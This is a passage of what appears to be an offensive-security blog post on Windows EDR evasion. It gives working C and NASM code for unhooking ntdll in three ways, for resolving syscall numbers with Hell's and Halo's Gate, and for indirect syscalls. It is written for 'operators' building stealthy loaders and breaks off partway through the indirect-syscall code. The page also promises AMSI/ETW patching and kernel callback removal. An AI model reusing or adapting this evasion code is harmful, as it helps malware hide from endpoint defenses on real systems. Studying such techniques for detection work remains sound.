@@ -1,0 +1,555 @@
+# https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/
+
+<!DOCTYPE html><html lang="en">
+<body>
+
+  <div class="bg-grid"></div>
+
+  
+
+  <main class="scroll">
+    <div class="pg">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="reading-progress" id="reading-progress" aria-hidden="true" style="transform: scaleX(0);"></div>
+
+<article class="article">
+  
+
+  <div class="article-main">
+    
+
+    
+
+    <div class="article-meta">
+      <span>Apr 17, 2026</span>
+      
+        <span class="wu-diff insane">ELITE</span>
+      
+      <span>· 10 MIN READ</span>
+    </div>
+
+    <h1 id="top" class="article-title">The Userland EDR Bypass Stack: Unhooking, Syscalls, ETW/AMSI, and Kernel Callbacks</h1>
+    <p class="article-desc">A comprehensive guide to the layered techniques that make up modern userland EDR evasion - restoring clean ntdll, dynamic syscall resolution via Hell's/Halo's/Tartarus' Gate, indirect syscalls, AMSI/ETW patching, and optional kernel callback removal. Theory, working code, OPSEC, and detection for each layer.</p>
+
+    
+    <div class="article-tags">
+      <span class="pill">#edr-bypass</span><span class="pill">#syscalls</span><span class="pill">#unhooking</span><span class="pill">#amsi</span><span class="pill">#etw</span><span class="pill">#hells-gate</span><span class="pill">#kernel-callbacks</span><span class="pill">#opsec</span>
+    </div>
+    
+
+    <div id="toc-inline" class="toc-inline">
+      <div class="toc-label">On this page</div>
+      <ol class="toc-list" id="toc-list-inline"><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-0-why-userland-edr-works" data-target="layer-0-why-userland-edr-works" class="active">Layer 0: Why Userland EDR Works</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-1-restoring-clean-ntdll---userland-unhooking" data-target="layer-1-restoring-clean-ntdll---userland-unhooking">Layer 1: Restoring Clean ntdll - Userland Unhooking</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#the-theory" data-target="the-theory">The theory</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1a---map-from-disk" data-target="technique-1a---map-from-disk">Technique 1.a - Map from disk</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1b---knowndlls-section" data-target="technique-1b---knowndlls-section">Technique 1.b - KnownDlls section</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1c---suspended-donor-process" data-target="technique-1c---suspended-donor-process">Technique 1.c - Suspended donor process</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#comparison" data-target="comparison">Comparison</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-2-dynamic-syscall-number-resolution" data-target="layer-2-dynamic-syscall-number-resolution">Layer 2: Dynamic Syscall Number Resolution</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#hells-gate---clean-case" data-target="hells-gate---clean-case">Hell’s Gate - clean case</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#halos-gate---walk-neighbors-when-hooked" data-target="halos-gate---walk-neighbors-when-hooked">Halo’s Gate - walk neighbors when hooked</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#tartarus-gate---double-hook-resilience" data-target="tartarus-gate---double-hook-resilience">Tartarus’ Gate - double-hook resilience</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-3-indirect-syscalls---calling-through-ntdll" data-target="layer-3-indirect-syscalls---calling-through-ntdll">Layer 3: Indirect Syscalls - Calling Through ntdll</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#implementation" data-target="implementation">Implementation</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-4-amsi-and-etw-patching" data-target="layer-4-amsi-and-etw-patching">Layer 4: AMSI and ETW Patching</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#amsi-patch---4-bytes-ring-3" data-target="amsi-patch---4-bytes-ring-3">AMSI patch - 4 bytes, ring 3</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#etw-patch---1-byte" data-target="etw-patch---1-byte">ETW patch - 1 byte</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#ordering-matters" data-target="ordering-matters">Ordering matters</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-5-kernel-callback-removal-the-nuclear-option" data-target="layer-5-kernel-callback-removal-the-nuclear-option">Layer 5: Kernel Callback Removal (The Nuclear Option)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#the-catch" data-target="the-catch">The catch</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#what-the-defender-actually-sees" data-target="what-the-defender-actually-sees">What the Defender Actually Sees</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#recommended-operator-order" data-target="recommended-operator-order">Recommended Operator Order</a></li></ol>
+    </div>
+
+    <div class="prose" id="post-content">
+      <p>EDR evasion at the userland layer is not one technique - it’s a <strong>stack</strong>. Each layer closes a specific detection channel, and a mature operator uses the layers together: unhook ntdll so your own calls don’t trip inline hooks, resolve syscall numbers dynamically so you’re portable, execute those syscalls indirectly so your stack still looks legitimate, patch AMSI and ETW before loading tooling so PowerShell/.NET stay silent, and - only when forced - reach into the kernel to unregister the callbacks that can see everything user mode does. This post walks each layer in order, explains the theory, shows the working code, and ends with what the defender actually sees.</p>
+
+<h2 id="layer-0-why-userland-edr-works">Layer 0: Why Userland EDR Works<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-0-why-userland-edr-works" aria-label="Copy link to Layer 0: Why Userland EDR Works"><span aria-hidden="true">#</span></a></h2>
+
+<p>A modern EDR agent has three hands inside your running process:</p>
+
+<ol>
+  <li><strong>Inline hooks in <code class="language-plaintext highlighter-rouge">ntdll.dll</code>.</strong> The first 5-15 bytes of selected functions (<code class="language-plaintext highlighter-rouge">NtOpenProcess</code>, <code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code>, <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code>, <code class="language-plaintext highlighter-rouge">NtProtectVirtualMemory</code>, a few dozen others) are replaced with a <code class="language-plaintext highlighter-rouge">jmp</code> to the agent’s inspection routine. The inspection routine records telemetry, optionally blocks, then (if allowed) returns to the original function body.</li>
+  <li><strong>AMSI scanning for in-process interpreters.</strong> PowerShell, VBScript, JScript, and .NET runtime all call <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> on every piece of script/code they are about to execute. The AV driver gets the content in clear text. This is how one-liner “EncodedCommand” loaders get caught.</li>
+  <li><strong>ETW (Event Tracing for Windows) providers.</strong> <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Threat-Intelligence</code>, <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Kernel-Audit-API-Calls</code>, and others emit events on syscall entry, DLL load, thread creation, etc. The EDR’s driver subscribes and correlates.</li>
+</ol>
+
+<p>Each layer below neutralizes one of these channels.</p>
+
+<h2 id="layer-1-restoring-clean-ntdll---userland-unhooking">Layer 1: Restoring Clean ntdll - Userland Unhooking<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-1-restoring-clean-ntdll---userland-unhooking" aria-label="Copy link to Layer 1: Restoring Clean ntdll - Userland Unhooking"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="the-theory">The theory<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#the-theory" aria-label="Copy link to The theory"><span aria-hidden="true">#</span></a></h3>
+
+<p>When the EDR DLL loads into your process, it walks ntdll’s export table and patches each function of interest. You can see this trivially with WinDbg:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>0:000&gt; u ntdll!NtAllocateVirtualMemory
+ntdll!NtAllocateVirtualMemory:
+00007ffc`3d4a1000 e9abcdf021 jmp edrdll+0x12345     ; hook!
+00007ffc`3d4a1005 ...
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>If you restore those bytes with a clean copy from disk, your next syscall bypasses the hook entirely. There are three common ways to get a clean copy.</p>
+
+<h3 id="technique-1a---map-from-disk">Technique 1.a - Map from disk<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1a---map-from-disk" aria-label="Copy link to Technique 1.a - Map from disk"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">ntdll.dll"</span><span class="p">,</span>
+                           <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
+                           <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">HANDLE</span> <span class="n">hMap</span>  <span class="o">=</span> <span class="n">CreateFileMappingA</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READONLY</span> <span class="o">|</span> <span class="n">SEC_IMAGE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">LPVOID</span> <span class="n">clean</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMap</span><span class="p">,</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">// Find .text section in both clean and hooked copies</span>
+<span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosH</span>  <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">hookedNtdll</span><span class="p">;</span>
+<span class="n">PIMAGE_NT_HEADERS</span> <span class="n">ntH</span>   <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">hookedNtdll</span> <span class="o">+</span> <span class="n">dosH</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+<span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">sect</span> <span class="o">=</span> <span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">ntH</span><span class="p">);</span>
+<span class="c1">// (locate ".text" and copy clean bytes over hooked bytes with VirtualProtect)</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p><strong>Downside</strong>: <code class="language-plaintext highlighter-rouge">CreateFile</code> on <code class="language-plaintext highlighter-rouge">ntdll.dll</code> is itself watched. EDRs with file-access telemetry will flag it.</p>
+
+<h3 id="technique-1b---knowndlls-section">Technique 1.b - KnownDlls section<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1b---knowndlls-section" aria-label="Copy link to Technique 1.b - KnownDlls section"><span aria-hidden="true">#</span></a></h3>
+
+<p>Windows caches a mapped copy of every <code class="language-plaintext highlighter-rouge">KnownDll</code> (including ntdll) under <code class="language-plaintext highlighter-rouge">\KnownDlls\ntdll.dll</code>. Open the section object directly, no disk I/O:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">HANDLE</span> <span class="n">hSec</span><span class="p">;</span>
+<span class="n">UNICODE_STRING</span> <span class="n">us</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="p">.</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="mi">34</span><span class="p">,</span> <span class="p">.</span><span class="n">Buffer</span> <span class="o">=</span> <span class="s">L"</span><span class="se">\\</span><span class="s">KnownDlls</span><span class="se">\\</span><span class="s">ntdll.dll"</span> <span class="p">};</span>
+<span class="n">OBJECT_ATTRIBUTES</span> <span class="n">oa</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">oa</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">us</span><span class="p">,</span> <span class="n">OBJ_CASE_INSENSITIVE</span> <span class="p">};</span>
+<span class="n">NtOpenSection</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hSec</span><span class="p">,</span> <span class="n">SECTION_MAP_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oa</span><span class="p">);</span>
+
+<span class="n">LPVOID</span> <span class="n">clean</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">SIZE_T</span> <span class="n">sz</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">NtMapViewOfSection</span><span class="p">(</span><span class="n">hSec</span><span class="p">,</span> <span class="n">NtCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">clean</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sz</span><span class="p">,</span>
+                   <span class="n">ViewUnmap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_READONLY</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Cleaner - no filesystem event. This is the technique in most mature loaders.</p>
+
+<h3 id="technique-1c---suspended-donor-process">Technique 1.c - Suspended donor process<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#technique-1c---suspended-donor-process" aria-label="Copy link to Technique 1.c - Suspended donor process"><span aria-hidden="true">#</span></a></h3>
+
+<p>Spawn a second process suspended. EDR hooks inject into the <em>primary</em> thread’s execution path, so a suspended process’s mapped ntdll is still clean for a brief window:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
+<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
+<span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span>
+               <span class="n">CREATE_SUSPENDED</span> <span class="o">|</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+
+<span class="c1">// Read the remote process's ntdll before it resumes</span>
+<span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteNtdllBase</span><span class="p">,</span> <span class="n">ourBuffer</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+<span class="n">TerminateProcess</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Most stealth, but noisy if your loader spawns a weirdly short-lived notepad.</p>
+
+<h3 id="comparison">Comparison<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#comparison" aria-label="Copy link to Comparison"><span aria-hidden="true">#</span></a></h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>Disk I/O</th>
+      <th>File-access telemetry</th>
+      <th>Best against</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Disk mapping</td>
+      <td>Yes</td>
+      <td>Visible</td>
+      <td>Basic AV</td>
+    </tr>
+    <tr>
+      <td>KnownDlls</td>
+      <td>No</td>
+      <td>None</td>
+      <td>File-monitoring EDR</td>
+    </tr>
+    <tr>
+      <td>Suspended donor</td>
+      <td>No</td>
+      <td>Process-create event</td>
+      <td>Aggressive inline hooking</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="layer-2-dynamic-syscall-number-resolution">Layer 2: Dynamic Syscall Number Resolution<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-2-dynamic-syscall-number-resolution" aria-label="Copy link to Layer 2: Dynamic Syscall Number Resolution"><span aria-hidden="true">#</span></a></h2>
+
+<p>Even with clean ntdll, you might want to bypass it entirely - direct syscalls from your own code cut out <code class="language-plaintext highlighter-rouge">ntdll.dll</code> as a middleman. But syscall numbers (SSNs) change between Windows builds. Hardcoding <code class="language-plaintext highlighter-rouge">NtOpenProcess = 0x26</code> breaks on the next update.</p>
+
+<p><strong>Hell’s Gate</strong> resolves SSNs at runtime by scanning each Nt-function’s first bytes. A clean syscall stub looks like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>4C 8B D1              mov r10, rcx
+B8 XX XX 00 00        mov eax, &lt;SSN&gt;
+F6 04 25 08 ...       test byte ptr [...], 1
+75 03                 jne +3
+0F 05                 syscall
+C3                    ret
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>Byte 4 is <code class="language-plaintext highlighter-rouge">0xB8</code> (the <code class="language-plaintext highlighter-rouge">mov eax, imm32</code>). Bytes 5-6 are the syscall number.</p>
+
+<h3 id="hells-gate---clean-case">Hell’s Gate - clean case<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#hells-gate---clean-case" aria-label="Copy link to Hell’s Gate - clean case"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">DWORD</span> <span class="nf">HellsGate</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">funcAddr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PBYTE</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">funcAddr</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x4C</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x8B</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xD1</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xB8</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// hooked or unknown - use Halo's Gate</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="halos-gate---walk-neighbors-when-hooked">Halo’s Gate - walk neighbors when hooked<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#halos-gate---walk-neighbors-when-hooked" aria-label="Copy link to Halo’s Gate - walk neighbors when hooked"><span aria-hidden="true">#</span></a></h3>
+
+<p>EDR replaces those first bytes with a <code class="language-plaintext highlighter-rouge">jmp</code>. The <strong>next</strong> Nt-function (32 bytes down in memory) is often not hooked, and SSNs are sequential in most Windows builds. So if <code class="language-plaintext highlighter-rouge">NtOpenProcess</code> is hooked but <code class="language-plaintext highlighter-rouge">NtOpenThread</code> 32 bytes later isn’t, and its SSN is <code class="language-plaintext highlighter-rouge">0x27</code>, then <code class="language-plaintext highlighter-rouge">NtOpenProcess</code> is <code class="language-plaintext highlighter-rouge">0x27 - 1 = 0x26</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">DWORD</span> <span class="nf">HalosGate</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">funcAddr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PBYTE</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">funcAddr</span><span class="p">;</span>
+
+    <span class="c1">// Try the direct read first</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x4C</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xB8</span><span class="p">)</span> <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+
+    <span class="c1">// Walk neighbors</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PBYTE</span> <span class="n">down</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">32</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">down</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x4C</span> <span class="o">&amp;&amp;</span> <span class="n">down</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xB8</span><span class="p">)</span>
+            <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">down</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">;</span>
+        <span class="n">PBYTE</span> <span class="n">up</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">32</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">up</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x4C</span> <span class="o">&amp;&amp;</span> <span class="n">up</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xB8</span><span class="p">)</span>
+            <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">up</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="tartarus-gate---double-hook-resilience">Tartarus’ Gate - double-hook resilience<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#tartarus-gate---double-hook-resilience" aria-label="Copy link to Tartarus’ Gate - double-hook resilience"><span aria-hidden="true">#</span></a></h3>
+
+<p>If <strong>both</strong> neighbors are hooked, Halo’s Gate fails. Tartarus extends the search radius and uses the <code class="language-plaintext highlighter-rouge">mov r10, rcx</code> prefix (<code class="language-plaintext highlighter-rouge">4C 8B D1</code>) as the robust discriminator rather than the <code class="language-plaintext highlighter-rouge">0x4C</code> start byte alone, since hooks can start with the same byte by coincidence.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th style="text-align: center">Handles single hook</th>
+      <th style="text-align: center">Handles double hook</th>
+      <th style="text-align: center">Disk I/O</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Hardcoded SSN</td>
+      <td style="text-align: center">✗</td>
+      <td style="text-align: center">✗</td>
+      <td style="text-align: center">None</td>
+    </tr>
+    <tr>
+      <td>Hell’s Gate</td>
+      <td style="text-align: center">✗ (clean path only)</td>
+      <td style="text-align: center">✗</td>
+      <td style="text-align: center">None</td>
+    </tr>
+    <tr>
+      <td>Halo’s Gate</td>
+      <td style="text-align: center">✓</td>
+      <td style="text-align: center">✗</td>
+      <td style="text-align: center">None</td>
+    </tr>
+    <tr>
+      <td>Tartarus’ Gate</td>
+      <td style="text-align: center">✓</td>
+      <td style="text-align: center">✓</td>
+      <td style="text-align: center">None</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="layer-3-indirect-syscalls---calling-through-ntdll">Layer 3: Indirect Syscalls - Calling Through ntdll<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-3-indirect-syscalls---calling-through-ntdll" aria-label="Copy link to Layer 3: Indirect Syscalls - Calling Through ntdll"><span aria-hidden="true">#</span></a></h2>
+
+<p>Direct syscalls (executing <code class="language-plaintext highlighter-rouge">syscall</code> from your own <code class="language-plaintext highlighter-rouge">.text</code>) work, but the instruction executes from a non-ntdll address - <strong>kernel callbacks can see that</strong>. Modern EDRs instrument the kernel to log the return address of every <code class="language-plaintext highlighter-rouge">syscall</code>. If it’s not within <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, that’s anomalous.</p>
+
+<p><strong>Indirect syscalls</strong> fix this: set up registers as normal, then <em>jump</em> to the <code class="language-plaintext highlighter-rouge">syscall; ret</code> gadget that lives inside ntdll. The kernel sees a return address inside ntdll - indistinguishable from a legitimate API call. The hook in <code class="language-plaintext highlighter-rouge">ntdll!NtOpenProcess</code> is still bypassed because your jump lands past the hook’s patched bytes.</p>
+
+<h3 id="implementation">Implementation<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#implementation" aria-label="Copy link to Implementation"><span aria-hidden="true">#</span></a></h3>
+
+<pre style="position: relative;"><code class="language-asm">; indirect_syscall.asm - NASM syntax
+bits 64
+default rel
+
+global _indirect_syscall
+
+section .text
+
+_indirect_syscall:
+    mov r10, rcx          ; shadow rcx - Windows x64 calling convention for syscalls
+    mov eax, [rel g_ssn]  ; syscall number (filled by runtime)
+    jmp [rel g_gadget]    ; jumps to ntdll's syscall;ret gadget
+
+section .data
+global g_ssn, g_gadget
+g_ssn:    dd 0
+g_gadget: dq 0
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre>
+
+<p>On the C side, at runtime:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// Resolve SSN for target function</span>
+<span class="n">g_ssn</span> <span class="o">=</span> <span class="n">HalosGate</span><span class="p">(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtOpenProcess"</span><span class="p">));</span>
+
+<span class="c1">// Find a syscall;ret gadget inside ntdll (there are many - any Nt-function's final two instructions)</span>
